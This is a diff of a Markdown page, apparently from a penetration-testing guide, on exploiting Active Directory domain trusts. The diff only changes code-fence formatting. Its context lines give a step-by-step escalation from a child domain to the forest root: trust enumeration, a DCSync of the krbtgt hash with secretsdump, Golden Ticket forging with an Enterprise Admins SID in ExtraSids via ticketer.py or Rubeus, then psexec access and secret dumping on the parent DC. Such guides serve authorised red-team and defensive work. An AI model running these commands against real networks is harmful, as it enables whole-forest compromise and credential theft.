@@ -17,7 +17,7 @@ Domain trusts allow users in one domain to authenticate to resources in another.
 
 Map trust relationships before attempting cross-domain attacks: bidirectional transitive trusts are the most exploitable.
 
-```powershell
+```powershell wrap
 # PowerView
 Get-DomainTrust
 Get-ForestTrust
@@ -28,7 +28,7 @@ nltest /domain_trusts
 ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
 ```
 
-```bash
+```bash wrap
 # impacket
 lookupsid.py $DOMAIN/$USER:$PASSWORD@$DC_IP
 
@@ -42,7 +42,7 @@ Within a forest, all domains share the same Schema and Enterprise Admins group (
 
 **Why it works:** Kerberos PAC validation checks the SID history and ExtraSids fields. Adding the Enterprise Admins SID to ExtraSids makes the forged TGT equivalent to a forest root Domain Admin.
 
-```bash
+```bash wrap
 # Step 1: Get child domain krbtgt hash (via DCSync from compromised child DC)
 secretsdump.py child.$DOMAIN/administrator:$PASSWORD@$DC_IP -just-dc-user krbtgt
 
@@ -54,7 +54,7 @@ lookupsid.py $DOMAIN/$USER:$PASSWORD@$DC_IP | grep "Domain SID"
 # Enterprise Admins SID = <parent_domain_SID>-519
 ```
 
-```bash
+```bash wrap
 # Step 4: Forge Golden Ticket with Enterprise Admins SID in ExtraSids
 ticketer.py \
   -nthash $HASH \
@@ -66,13 +66,13 @@ ticketer.py \
 export KRB5CCNAME=Administrator.ccache
 ```
 
-```bash
+```bash wrap
 # Step 5: Access parent domain resources
 psexec.py -k -no-pass $DOMAIN/Administrator@parent-dc.$DOMAIN
 secretsdump.py -k -no-pass $DOMAIN/Administrator@parent-dc.$DOMAIN
 ```
 
-```powershell
+```powershell wrap
 # Rubeus: forge ticket on Windows
 Rubeus.exe golden \
   /user:Administrator \
@@ -87,13 +87,13 @@ Rubeus.exe golden \
 
 In external trusts, check if any accounts from the trusted domain are members of local groups: a common misconfiguration that grants unexpected access.
 
-```powershell
+```powershell wrap
 # Find users from foreign domains in local groups
 Get-DomainForeignGroupMember
 Get-DomainForeignUser
 ```
 
-```bash
+```bash wrap
 # bloodyAD
 bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get object "Domain Users" --attr member
 ```
